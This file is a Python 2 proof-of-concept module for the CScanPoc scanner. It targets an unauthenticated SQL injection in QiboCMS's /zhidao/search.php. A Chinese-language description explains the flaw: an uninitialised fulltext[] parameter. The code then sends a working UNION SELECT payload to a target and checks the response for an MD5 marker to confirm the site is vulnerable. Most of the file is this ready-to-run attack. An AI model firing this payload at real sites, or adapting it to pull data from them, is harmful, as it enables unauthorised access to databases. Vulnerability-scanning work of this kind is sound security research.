# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0032' # 平台漏洞编号，留空
    name = '齐博CMS知道系统 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-17'  # 漏洞公布时间
    desc = '''
        /zhidao/search.php
        进入该语句需要count($forSearchKey)>2 但是forSearchKey我们是可以控制的
        在第一个语句中把先是赋值给数组fullext，然后在分割为字符串赋给变量where（）
        这本来是没有问题的，但是数组fullext未初始化，结合齐博的伪全局机制就造成了sql注入（无限制 无需登录）
        而在同一页面中带进了查询语句：/zhidao/search.php?&tags=ll%20ll%20ll&keyword=111&fulltext[]=11)
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3303/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6cbe1ced-ad0e-40d1-abb0-49aea6dced10'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
             
            payload = "/zhidao/search.php?&tags=ll%20ll%20ll&keyword=111&fulltext[]=11)%20and%201=2%20union%20select%20md5%28c%29"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()